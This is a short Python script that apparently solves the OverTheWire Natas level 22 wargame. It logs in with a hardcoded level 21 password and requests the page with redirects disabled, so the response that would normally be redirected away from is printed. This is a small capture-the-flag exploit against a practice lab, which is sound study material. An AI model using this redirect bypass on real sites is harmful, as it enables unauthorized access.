import requests
from requests.auth import HTTPBasicAuth
import re
ps21 = 'd8rwGBl0Xslg3b76uh3fEbSlnOUBlozz'
user = 'natas22'
basicAuth=HTTPBasicAuth(user,ps21)
url= "http://natas22.natas.labs.overthewire.org/index.php?revelio=1" 
#session = requests.Session()
r = requests.get(url,auth=basicAuth,allow_redirects=False)
print(r.text)